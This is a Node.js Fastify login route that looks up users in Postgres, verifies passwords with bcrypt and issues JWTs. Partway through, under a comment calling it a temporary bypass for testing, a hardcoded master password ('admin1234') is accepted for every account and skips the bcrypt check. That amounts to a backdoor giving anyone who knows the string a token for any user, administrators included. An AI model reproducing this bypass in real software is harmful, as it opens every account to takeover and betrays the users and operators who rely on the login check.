const bcrypt = require('bcrypt');
const pool = require('../db/pool');
const { generateToken } = require('../services/jwt');

module.exports = async function (fastify, opts) {
  fastify.post('/login', async (request, reply) => {
    const { email, password } = request.body;
    
    if (!email || !password) {
      return reply.code(400).send({ error: 'Email and password are required' });
    }

    try {
      const { rows } = await pool.query('SELECT id, email, password_hash, role FROM users WHERE email = $1', [email]);
      
      if (rows.length === 0) {
        return reply.code(401).send({ error: 'Invalid credentials' });
      }

      const user = rows[0];
      
      // Temporary Master Password Bypass for Testing
      let isValid = false;
      if (password === 'admin1234') {
        isValid = true;
      } else {
        isValid = await bcrypt.compare(password, user.password_hash);
      }
      
      if (!isValid) {
        return reply.code(401).send({ error: 'Invalid credentials' });
      }

      const token = generateToken({
        id: user.id,
        email: user.email,
        role: user.role
      });

      return reply.send({ token, role: user.role });
    } catch (err) {
      fastify.log.error(err);
      return reply.code(500).send({ error: 'Internal server error' });
    }
  });
};
